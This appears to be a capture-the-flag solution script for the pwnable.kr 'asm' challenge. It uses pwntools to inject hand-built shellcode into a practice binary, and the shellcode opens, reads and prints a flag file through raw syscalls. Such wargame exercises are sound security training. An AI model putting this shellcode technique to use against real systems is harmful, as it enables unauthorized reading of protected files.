from pwn import *

context.arch = "amd64"

p = process("/home/asm/asm")

shellcode_path = "/home/asm/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

buf = hex(0x41414000)

shellcode_encode = "mov rax, 0x"

for ind, c in enumerate(shellcode_path):
    shellcode_encode += ("\n" if ind is not 0 and ind % 8 is 0 else "") + hex(ord(shellcode_path[(ind + (8 - ind%8)) if ind + 8 < len(shellcode_path) else ind]))[2:]

shellcode_encode = "\npush rax\nmov rax, 0x".join(map(lambda x: x.zfill(16), shellcode_encode.split("\n")[::-1])) + "\npush rax"


shellcode = asm('''
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx

'''
+ shellcode_encode +
'''

mov rax, 0x5
mov rbx, rsp
mov rcx, 0x0
mov rdx, 0777
int 0x80

mov rbx, rax
mov rax, 0x3
mov rcx, ''' + buf + '''
mov rdx, 0x50
int 0x80

mov rax, 0x4
mov rbx, 0x1
mov rcx, ''' + buf + '''
mov rdx, 0x50
int 0x80

mov rax, 0x1
mov rbx, 0x0
int 0x80
''')

p.sendlineafter("", shellcode)

p.interactive()